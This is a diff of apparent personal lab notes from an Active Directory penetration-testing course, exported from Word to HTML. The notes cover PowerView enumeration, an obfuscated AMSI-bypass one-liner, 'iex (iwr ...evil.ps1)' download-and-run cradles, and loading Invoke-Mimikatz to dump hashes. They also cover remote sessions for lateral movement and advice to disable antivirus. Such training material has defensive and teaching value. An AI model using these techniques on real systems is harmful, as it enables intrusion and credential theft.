@@ -1803,7 +1803,7 @@ class=SpellE>whoami</span> &amp; ipconfig &amp; <span class=SpellE>whoami</span>
 
 <p class=MsoNormal>PS C:\Users\student157&gt; [<span class=SpellE>System.Net.Dns</span><span
 class=GramE>]::</span><span class=SpellE>GetHostByName</span>(($<span
-class=SpellE>env:computerName</span>))<span style='mso-spacerun:yes'>  </span><o:p></o:p></p>
+class=SpellE>env:computerName</span>))<span style='mso-spacerun:yes'>Â  </span><o:p></o:p></p>
 
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
 
@@ -1824,20 +1824,20 @@ class=GramE>ADClass</span></span><span class=GramE>::</span><span class=SpellE>G
      PowerShell script using dot sourcing <span class=GramE>PS .</span>
      C:\AD\Tools\Powershell.ps1<o:p></o:p></li>
  <li class=MsoNormal style='mso-list:l1 level1 lfo1;tab-stops:list .5in'>A
-     module can be imported with:<span style='mso-spacerun:yes'>  </span>--&gt;
+     module can be imported with:<span style='mso-spacerun:yes'>Â  </span>--&gt;
      <b>Import-Module</b> &lt;<span class=SpellE>modulename</span>&gt; .<span
      class=SpellE>psd</span> (file Name)<o:p></o:p></li>
  <li class=MsoNormal style='mso-list:l1 level1 lfo1;tab-stops:list .5in'>All
      the commands in a module can be listed with:<span
-     style='mso-spacerun:yes'>  </span>--<span class=GramE>&gt;<span
-     style='mso-spacerun:yes'>  </span>Get</span>-Command -Module &lt;<span
+     style='mso-spacerun:yes'>Â  </span>--<span class=GramE>&gt;<span
+     style='mso-spacerun:yes'>Â  </span>Get</span>-Command -Module &lt;<span
      class=SpellE>modulename</span>&gt;<o:p></o:p></li>
 </ul>
 
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
 
 <p class=MsoNormal>PowerShell script enumeration and usage also difference
-between &lt; &gt; <span class=GramE>{ }</span> etc.…<o:p></o:p></p>
+between &lt; &gt; <span class=GramE>{ }</span> etc.Â…<o:p></o:p></p>
 
 <p class=MsoNormal>Once the script successfully loaded into the memory and we
 can call <span class=GramE>each and every</span> function along with the
@@ -1847,23 +1847,23 @@ examples such as -full, -detailed<o:p></o:p></p>
 
 <ul style='margin-top:0in' type=disc>
  <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
-     style='mso-spacerun:yes'>    </span>&quot;<span class=GramE>get</span>-help
+     style='mso-spacerun:yes'>Â Â Â  </span>&quot;<span class=GramE>get</span>-help
      Get-<span class=SpellE>NetGroup</span>&quot;<o:p></o:p></li>
  <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
-     style='mso-spacerun:yes'>    </span>&quot;<span class=GramE>get</span>-help
+     style='mso-spacerun:yes'>Â Â Â  </span>&quot;<span class=GramE>get</span>-help
      Get-<span class=SpellE>NetGroup</span> -examples&quot;.<o:p></o:p></li>
  <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
-     style='mso-spacerun:yes'>    </span>&quot;<span class=GramE>get</span>-help
+     style='mso-spacerun:yes'>Â Â Â  </span>&quot;<span class=GramE>get</span>-help
      Get-<span class=SpellE>NetGroup</span> -full&quot;.<o:p></o:p></li>
  <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
-     style='mso-spacerun:yes'>    </span>&quot;<span class=GramE>get</span>-help
+     style='mso-spacerun:yes'>Â Â Â  </span>&quot;<span class=GramE>get</span>-help
      Get-<span class=SpellE>NetGroup</span> -detailed&quot;.<o:p></o:p></li>
  <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
-     style='mso-spacerun:yes'>    </span>&quot;<span class=GramE>show</span>-command
+     style='mso-spacerun:yes'>Â Â Â  </span>&quot;<span class=GramE>show</span>-command
      Get-<span class=SpellE>NetGroup</span>&quot;.<o:p></o:p></li>
  <li class=MsoNormal style='mso-list:l0 level1 lfo2;tab-stops:list .5in'><span
-     style='mso-spacerun:yes'>    </span>&quot;Update-Help<span class=GramE>&quot;<span
-     style='mso-spacerun:yes'>  </span>--</span> update help system<o:p></o:p></li>
+     style='mso-spacerun:yes'>Â Â Â  </span>&quot;Update-Help<span class=GramE>&quot;<span
+     style='mso-spacerun:yes'>Â  </span>--</span> update help system<o:p></o:p></li>
 </ul>
 
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
@@ -1874,18 +1874,18 @@ examples such as -full, -detailed<o:p></o:p></p>
 
 <p class=MsoNormal>SYNTAX<o:p></o:p></p>
 
-<p class=MsoNormal><span style='mso-spacerun:yes'>    </span>Get-<span
+<p class=MsoNormal><span style='mso-spacerun:yes'>Â Â Â  </span>Get-<span
 class=SpellE>NetGroup</span> [[-<span class=SpellE>GroupName</span>]
 &lt;String&gt;] [[-SID] &lt;String&gt;] [[-<span class=SpellE>UserName</span>]
 &lt;String&gt;] [[-Filter] &lt;String&gt;] [[-Domain] &lt;String&gt;]<o:p></o:p></p>
 
-<p class=MsoNormal><span style='mso-spacerun:yes'>    </span>[[-<span
+<p class=MsoNormal><span style='mso-spacerun:yes'>Â Â Â  </span>[[-<span
 class=SpellE>DomainController</span>] &lt;String&gt;] [[-<span class=SpellE>ADSpath</span>]
 &lt;String&gt;] [-<span class=SpellE>AdminCount</span>] [-<span class=SpellE>FullData</span>]
 [-<span class=SpellE>RawSids</span>] [-<span class=SpellE>AllTypes</span>] [[-<span
 class=SpellE>PageSize</span>]<o:p></o:p></p>
 
-<p class=MsoNormal><span style='mso-spacerun:yes'>    </span>&lt;Int32&gt;]
+<p class=MsoNormal><span style='mso-spacerun:yes'>Â Â Â  </span>&lt;Int32&gt;]
 [[-Credential] &lt;<span class=SpellE>PSCredential</span>&gt;] [&lt;<span
 class=SpellE>CommonParameters</span>&gt;]<o:p></o:p></p>
 
@@ -1956,34 +1956,34 @@ class=SpellE>t`RuE</span>} )<o:p></o:p></p>
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
 
 <p class=MsoNormal><span class=SpellE>S`eT-It`em</span> ( 'V'+'<span
-class=SpellE>aR</span>' +<span style='mso-spacerun:yes'>  </span>'IA' +
-((&quot;{1}{0}&quot;-f'1','blE:')+'q2')<span style='mso-spacerun:yes'> 
-</span>+ ('<span class=SpellE>uZ</span>'+'x')<span style='mso-spacerun:yes'> 
-</span>) ( [<span class=SpellE>TYpE</span>](<span style='mso-spacerun:yes'> 
+class=SpellE>aR</span>' +<span style='mso-spacerun:yes'>Â  </span>'IA' +
+((&quot;{1}{0}&quot;-f'1','blE:')+'q2')<span style='mso-spacerun:yes'>Â 
+</span>+ ('<span class=SpellE>uZ</span>'+'x')<span style='mso-spacerun:yes'>Â 
+</span>) ( [<span class=SpellE>TYpE</span>](<span style='mso-spacerun:yes'>Â 
 </span>&quot;{1}{0}&quot;-F'F','<span class=SpellE>rE</span>'<span
-style='mso-spacerun:yes'>  </span>) )<span style='mso-spacerun:yes'> 
-</span>;<span style='mso-spacerun:yes'>    </span>(<span
-style='mso-spacerun:yes'>    </span>Get-<span class=SpellE>varI`A`BLE</span><span
-style='mso-spacerun:yes'>  </span>( ('1Q'+'2U')<span style='mso-spacerun:yes'> 
-</span>+'<span class=SpellE>zX</span>'<span style='mso-spacerun:yes'> 
-</span>)<span style='mso-spacerun:yes'>  </span>-<span class=SpellE>VaL</span><span
-style='mso-spacerun:yes'>  </span>).&quot;A`ss`Embly&quot;.&quot;<span
-class=SpellE>GET`TY`Pe</span>&quot;((<span style='mso-spacerun:yes'> 
+style='mso-spacerun:yes'>Â  </span>) )<span style='mso-spacerun:yes'>Â 
+</span>;<span style='mso-spacerun:yes'>Â Â Â  </span>(<span
+style='mso-spacerun:yes'>Â Â Â  </span>Get-<span class=SpellE>varI`A`BLE</span><span
+style='mso-spacerun:yes'>Â  </span>( ('1Q'+'2U')<span style='mso-spacerun:yes'>Â 
+</span>+'<span class=SpellE>zX</span>'<span style='mso-spacerun:yes'>Â 
+</span>)<span style='mso-spacerun:yes'>Â  </span>-<span class=SpellE>VaL</span><span
+style='mso-spacerun:yes'>Â  </span>).&quot;A`ss`Embly&quot;.&quot;<span
+class=SpellE>GET`TY`Pe</span>&quot;((<span style='mso-spacerun:yes'>Â 
 </span>&quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f('<span class=SpellE>Uti'+'l</span>'),'A',('Am'+'<span
 class=SpellE>si</span>'),((&quot;{0}{1}&quot; -f '.<span class=SpellE>M','an</span>')+'<span
 class=SpellE>age'+'men'+'t</span>.'),('<span class=SpellE>u'+'to</span>'+(&quot;{0}{2}{1}&quot;
 -f 'ma','.','<span class=SpellE>tion</span>')),'s',((&quot;{1}{0}&quot;-f '<span
 class=SpellE>t','Sys</span>')+'<span class=SpellE>em</span>')<span
-style='mso-spacerun:yes'>  </span>) ).&quot;<span class=SpellE>g`etf`iElD</span>&quot;(<span
-style='mso-spacerun:yes'>  </span>( &quot;{0}{2}{1}&quot; -f('a'+'<span
+style='mso-spacerun:yes'>Â  </span>) ).&quot;<span class=SpellE>g`etf`iElD</span>&quot;(<span
+style='mso-spacerun:yes'>Â  </span>( &quot;{0}{2}{1}&quot; -f('a'+'<span
 class=SpellE>msi</span>'),'d',('I'+(&quot;{0}{1}&quot; -f '<span class=SpellE>ni</span>','<span
 class=SpellE>tF</span>')+(&quot;{1}{0}&quot;-f '<span class=SpellE>ile</span>','a'))<span
-style='mso-spacerun:yes'>  </span>),(<span style='mso-spacerun:yes'> 
+style='mso-spacerun:yes'>Â  </span>),(<span style='mso-spacerun:yes'>Â 
 </span>&quot;{2}{4}{0}{1}{3}&quot; -f ('<span class=SpellE>S'+'tat</span>'),'<span
 class=SpellE>i</span>',('Non'+(&quot;{1}{0}&quot; -f'<span class=SpellE>ubl</span>','P')+'<span
 class=SpellE>i</span>'),'<span class=SpellE>c','c</span>,'<span
-style='mso-spacerun:yes'>  </span>)).&quot;<span class=SpellE>sE`T`VaLUE</span>&quot;(<span
-style='mso-spacerun:yes'>  </span>${<span class=SpellE>n`ULl</span>},${<span
+style='mso-spacerun:yes'>Â  </span>)).&quot;<span class=SpellE>sE`T`VaLUE</span>&quot;(<span
+style='mso-spacerun:yes'>Â  </span>${<span class=SpellE>n`ULl</span>},${<span
 class=SpellE>t`RuE</span>} )<o:p></o:p></p>
 
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
@@ -2052,7 +2052,7 @@ user/group) has sessions:</b><o:p></o:p></p>
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
 
 <p class=MsoNormal>PS C:\AD\Tools&gt; Invoke-<span class=SpellE>UserHunter</span>
--Verbose<span style='mso-spacerun:yes'>   </span><o:p></o:p></p>
+-Verbose<span style='mso-spacerun:yes'>Â Â  </span><o:p></o:p></p>
 
 <p class=MsoNormal>PS C:\AD\Tools&gt; Invoke-<span class=SpellE>UserHunter</span>
 -Verbose -<span class=SpellE>GroupName</span> &quot;<span class=SpellE>rdpusers</span>&quot;<o:p></o:p></p>
@@ -2133,7 +2133,7 @@ class=SpellE>ie.quit</span>();<span class=SpellE>iex</span> $response<o:p></o:p>
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PSv3
-onwards:<span style='mso-spacerun:yes'>  </span>-<span class=SpellE>iex</span>
+onwards:<span style='mso-spacerun:yes'>Â  </span>-<span class=SpellE>iex</span>
 (<span class=SpellE>iwr</span> '<a href="http://192.168.230.1/evil.ps1">http://192.168.230.1/evil.ps1</a>')<o:p></o:p></span></p>
 
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
@@ -2303,13 +2303,13 @@ v:shapes="Picture_x0020_88"><![endif]></span><o:p></o:p></p>
   <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
   <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
   EN-IN'>ComputerName</span></span><span lang=EN-IN style='mso-ansi-language:
-  EN-IN'><span style='mso-spacerun:yes'>                             </span><span
+  EN-IN'><span style='mso-spacerun:yes'>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  </span><span
   class=SpellE>IsAdmin</span><o:p></o:p></span></p>
   <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>------------<span
-  style='mso-spacerun:yes'>                             </span>-------<o:p></o:p></span></p>
+  style='mso-spacerun:yes'>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  </span>-------<o:p></o:p></span></p>
   <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>dcorp-<span
   class=GramE>stud157.dollarcorp.moneycorp</span>.local<span
-  style='mso-spacerun:yes'>   </span>False<o:p></o:p></span></p>
+  style='mso-spacerun:yes'>Â Â  </span>False<o:p></o:p></span></p>
   </td>
  </tr>
  <tr style='mso-yfti-irow:2;mso-yfti-lastrow:yes'>
@@ -2323,13 +2323,13 @@ v:shapes="Picture_x0020_88"><![endif]></span><o:p></o:p></p>
   <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
   <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
   EN-IN'>ComputerName</span></span><span lang=EN-IN style='mso-ansi-language:
-  EN-IN'><span style='mso-spacerun:yes'>                              </span><span
+  EN-IN'><span style='mso-spacerun:yes'>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  </span><span
   class=SpellE>IsAdmin</span><o:p></o:p></span></p>
   <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>------------<span
-  style='mso-spacerun:yes'>                              </span>-------<o:p></o:p></span></p>
+  style='mso-spacerun:yes'>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  </span>-------<o:p></o:p></span></p>
   <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
   EN-IN'>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span></span><span
-  lang=EN-IN style='mso-ansi-language:EN-IN'><span style='mso-spacerun:yes'>   
+  lang=EN-IN style='mso-ansi-language:EN-IN'><span style='mso-spacerun:yes'>Â Â Â 
   </span>True<o:p></o:p></span></p>
   </td>
  </tr>
@@ -2374,9 +2374,9 @@ $true<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>2. PS
 C:\AD\Tools<span class=GramE>&gt; .</span> .\PowerView.ps1<span
-style='mso-spacerun:yes'>   </span>--<span class=GramE>&gt;<span
-style='mso-spacerun:yes'>  </span>where</span> <span class=SpellE>studentx</span>
-has local administrative access.<span style='mso-spacerun:yes'> 
+style='mso-spacerun:yes'>Â Â  </span>--<span class=GramE>&gt;<span
+style='mso-spacerun:yes'>Â  </span>where</span> <span class=SpellE>studentx</span>
+has local administrative access.<span style='mso-spacerun:yes'>Â 
 </span>(Find-PSRemotingLocalAdminAccess.ps1 script)<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
@@ -2392,7 +2392,7 @@ lang=EN-IN style='mso-ansi-language:EN-IN'><o:p></o:p></span></p>
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>3.<span
-style='mso-spacerun:yes'>  </span>make sure that <span class=GramE>have to</span>
+style='mso-spacerun:yes'>Â  </span>make sure that <span class=GramE>have to</span>
 disabled firewall incoming connection (Reverse connective or any shell for an
 access_<o:p></o:p></span></p>
 
@@ -2460,31 +2460,31 @@ Invoke-<span class=SpellE>UserHunter</span> -<span class=SpellE>checkaccess</spa
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>UserDomain</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><span
-style='mso-spacerun:yes'>    </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> <span class=SpellE>dcorp</span><o:p></o:p></span></p>
+style='mso-spacerun:yes'>Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> <span class=SpellE>dcorp</span><o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>UserName</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><span
-style='mso-spacerun:yes'>      </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> <span class=SpellE>svcadmin</span><span
-style='mso-spacerun:yes'>                                                                             
+style='mso-spacerun:yes'>Â Â Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> <span class=SpellE>svcadmin</span><span
+style='mso-spacerun:yes'>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 
 </span><o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>ComputerName</span></span><span lang=EN-IN style='mso-ansi-language:
-EN-IN'><span style='mso-spacerun:yes'>  </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> <span class=SpellE>dcorp-mgmt.dollarcorp.moneycorp.local</span><span
-style='mso-spacerun:yes'>  </span>--&gt; <o:p></o:p></span></p>
+EN-IN'><span style='mso-spacerun:yes'>Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> <span class=SpellE>dcorp-mgmt.dollarcorp.moneycorp.local</span><span
+style='mso-spacerun:yes'>Â  </span>--&gt; <o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>IPAddress</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><span
-style='mso-spacerun:yes'>     </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> 172.16.4.44<o:p></o:p></span></p>
+style='mso-spacerun:yes'>Â Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> 172.16.4.44<o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>SessionFrom</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><span
-style='mso-spacerun:yes'>   </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span><o:p></o:p></span></p>
+style='mso-spacerun:yes'>Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span><o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span class=GramE><span lang=EN-IN
 style='mso-ansi-language:EN-IN'>SessionFromName</span></span></span><span
@@ -2493,8 +2493,8 @@ lang=EN-IN style='mso-ansi-language:EN-IN'><o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>LocalAdmin</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'><span
-style='mso-spacerun:yes'>    </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> True<o:p></o:p></span></p>
+style='mso-spacerun:yes'>Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> True<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
 
@@ -2502,7 +2502,7 @@ style='mso-spacerun:yes'>  </span>:</span> True<o:p></o:p></span></p>
 C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt;
 Invoke-Command -<span class=SpellE>ComputerName</span> <span class=SpellE>dcorp-mgmt.dollarcorp.moneycorp.local</span>
 -<span class=SpellE>ScriptBlock</span> {<span class=SpellE>whoami;hostname</span>}<span
-style='mso-spacerun:yes'>  </span>--verification <o:p></o:p></span></p>
+style='mso-spacerun:yes'>Â  </span>--verification <o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>dcorp</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'>\<span
@@ -2515,7 +2515,7 @@ EN-IN'>dcorp-mgmt</span></span><span lang=EN-IN style='mso-ansi-language:EN-IN'>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
 C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt; <span
-class=SpellE>whoami</span><span style='mso-spacerun:yes'>  </span>--&gt; find <span
+class=SpellE>whoami</span><span style='mso-spacerun:yes'>Â  </span>--&gt; find <span
 class=SpellE>dcorp-mgment</span> have local privilege and also access to us.<o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
@@ -2528,14 +2528,14 @@ class=SpellE>ciadmin</span><o:p></o:p></span></p>
 C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt; <span
 class=SpellE>iex</span> (<span class=SpellE>iwr</span> <a
 href="http://172.16.100.157/Invoke-Mimikatz.ps1">http://172.16.100.157/Invoke-Mimikatz.ps1</a>
--<span class=SpellE>UseBasicParsing</span>)<span style='mso-spacerun:yes'> 
+-<span class=SpellE>UseBasicParsing</span>)<span style='mso-spacerun:yes'>Â 
 </span>--&gt; dump hashes <o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
 C:\Program Files (x<span class=GramE>86)\Jenkins\workspace\project0</span>&gt;
 $sess = New-<span class=SpellE>PSSession</span> -<span class=SpellE>ComputerName</span>
 <span class=SpellE>dcorp-mgmt.dollarcorp.moneycorp.local</span><span
-style='mso-spacerun:yes'>   </span>--&gt; create session for execute your
+style='mso-spacerun:yes'>Â Â  </span>--&gt; create session for execute your
 payload in remote machine before must be disable anti-virus (because anti-virus
 will block in memory for execution)<o:p></o:p></span></p>
 
@@ -2557,7 +2557,7 @@ Invoke-command -<span class=SpellE>ScriptBlock</span> ${<span class=SpellE>funct
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Now we have
 got <span class=SpellE><span class=GramE><b>svcadmin</b></span></span><span
-class=GramE><span style='mso-spacerun:yes'>  </span>account</span>. <o:p></o:p></span></p>
+class=GramE><span style='mso-spacerun:yes'>Â  </span>account</span>. <o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
 
@@ -2591,11 +2591,11 @@ C:\AD\Tools&gt; Find-<span class=SpellE>LocalAdminAccess</span><o:p></o:p></span
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>dcorp-<span
 class=GramE>stud157.dollarcorp.moneycorp</span>.local<span
-style='mso-spacerun:yes'>     </span>--&gt; your first machine.<o:p></o:p></span></p>
+style='mso-spacerun:yes'>Â Â Â Â  </span>--&gt; your first machine.<o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span></span><span
-lang=EN-IN style='mso-ansi-language:EN-IN'><span style='mso-spacerun:yes'>   
+lang=EN-IN style='mso-ansi-language:EN-IN'><span style='mso-spacerun:yes'>Â Â Â 
 </span>--&gt; local admin access machine<o:p></o:p></span></p>
 
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
@@ -2616,7 +2616,7 @@ EN-IN'><o:p></o:p></span></p>
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>&nbsp;<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>PS
-C:\Windows\system32<span class=GramE>&gt;<span style='mso-spacerun:yes'> 
+C:\Windows\system32<span class=GramE>&gt;<span style='mso-spacerun:yes'>Â 
 </span>Invoke</span>-Command -<span class=SpellE>ComputerName</span> <span
 class=SpellE>dcorp-adminsrv.dollarcorp.moneycorp.local</span> -<span
 class=SpellE>ScriptBlock</span> {<span class=SpellE>whoami;hostname</span>}<o:p></o:p></span></p>
@@ -2636,9 +2636,9 @@ C:\Windows\system32&gt;<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Also, any
 attempt to run Invoke-Mimikatz on <span class=SpellE>dcorp-adminsrv</span>
-results in errors about language mode.<span style='mso-spacerun:yes'>  
-</span>--<span class=GramE>&gt;<span style='mso-spacerun:yes'>  </span>language</span>
-mode.<span style='mso-spacerun:yes'>  </span>explained in enumeration<o:p></o:p></span></p>
+results in errors about language mode.<span style='mso-spacerun:yes'>Â Â 
+</span>--<span class=GramE>&gt;<span style='mso-spacerun:yes'>Â  </span>language</span>
+mode.<span style='mso-spacerun:yes'>Â  </span>explained in enumeration<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>This is because
 <span class=SpellE>Applocker</span> is configured on <span class=SpellE>dcorp-<span
@@ -2651,7 +2651,7 @@ Mode when we connect using PowerShell Remoting.<o:p></o:p></span></p>
 class=SpellE>dcorp-<span class=GramE>adminsrv.dollarcorp</span>.moneycorp.local</span>]:
 PS C:\Users\student157\Documents&gt; $<span class=SpellE>ExecutionContext.SessionState.LanguageModeConstrainedLanguage</span><o:p></o:p></span></p>
 
-<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Now, let’s
+<p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Now, letÂ’s
 enumerate the <span class=SpellE>applocker</span> policy.<o:p></o:p></span></p>
 
 <p class=MsoNormal>&nbsp;<o:p></o:p></p>
@@ -2666,13 +2666,13 @@ class=SpellE>RuleCollections</span><o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>PathConditions</span></span><span lang=EN-IN style='mso-ansi-language:
-EN-IN'><span style='mso-spacerun:yes'>    </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> {%PROGRAMFILES%\*}<o:p></o:p></span></p>
+EN-IN'><span style='mso-spacerun:yes'>Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> {%PROGRAMFILES%\*}<o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>PathExceptions</span></span><span lang=EN-IN style='mso-ansi-language:
-EN-IN'><span style='mso-spacerun:yes'>    </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> {}<o:p></o:p></span></p>
+EN-IN'><span style='mso-spacerun:yes'>Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> {}<o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=GramE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>PublisherExceptions :</span></span><span lang=EN-IN style='mso-ansi-language:
@@ -2680,31 +2680,31 @@ EN-IN'> {}<o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>HashExceptions</span></span><span lang=EN-IN style='mso-ansi-language:
-EN-IN'><span style='mso-spacerun:yes'>    </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> {}<o:p></o:p></span></p>
+EN-IN'><span style='mso-spacerun:yes'>Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> {}<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Id<span
-style='mso-spacerun:yes'>                </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> 06dce67b-934c-454f-a263-2515c8796a5d<o:p></o:p></span></p>
+style='mso-spacerun:yes'>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> 06dce67b-934c-454f-a263-2515c8796a5d<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Name<span
-style='mso-spacerun:yes'>              </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> (Default Rule) All scripts located
+style='mso-spacerun:yes'>Â Â Â Â Â Â Â Â Â Â Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> (Default Rule) All scripts located
 in the Program Files folder<o:p></o:p></span></p>
 
 <p class=MsoNormal><span lang=EN-IN style='mso-ansi-language:EN-IN'>Description<span
-style='mso-spacerun:yes'>       </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> Allows members of the Everyone group
+style='mso-spacerun:yes'>Â Â Â Â Â Â  </span><span class=GramE><span
+style='mso-spacerun:yes'>Â Â </span>:</span> Allows members of the Everyone group
 to run scripts that are located in the Program Files folder.<o:p></o:p></span></p>
 
 <p class=MsoNormal><span class=SpellE><span lang=EN-IN style='mso-ansi-language:
 EN-IN'>UserOrGroupSid</span></span><span lang=EN-IN style='mso-ansi-language:
-EN-IN'><span style='mso-spacerun:yes'>    </span><span class=GramE><span
-style='mso-spacerun:yes'>  </span>:</span> S-1-1-0<o:p></o:p></span></p>
+EN-IN'><span style='mso-spacerun:yes'>Â Â Â  </span><span class=GramE><span
